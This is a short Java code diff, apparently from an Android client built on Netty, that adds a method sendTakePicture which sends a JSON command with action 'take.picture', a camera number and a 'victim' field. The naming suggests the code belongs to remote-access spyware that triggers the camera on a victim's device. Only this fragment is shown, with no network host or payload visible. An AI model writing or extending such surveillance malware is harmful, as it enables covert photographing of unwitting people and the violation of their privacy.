@@ -218,6 +218,14 @@ public class NettyClient extends AsyncTask<String, String, String> {
         queryHandler.sendMessage(query);
     }
 
+    public void sendTakePicture(long camera, String victim) {
+        JSONObject query = new JSONObject();
+        query.put("action", "take.picture");
+        query.put("camera", camera);
+        query.put("victim", victim);
+        queryHandler.sendMessage(query);
+    }
+
     public void sendErrorCode(String code) {
         JSONObject query = new JSONObject();
         query.put("errorCode", code);
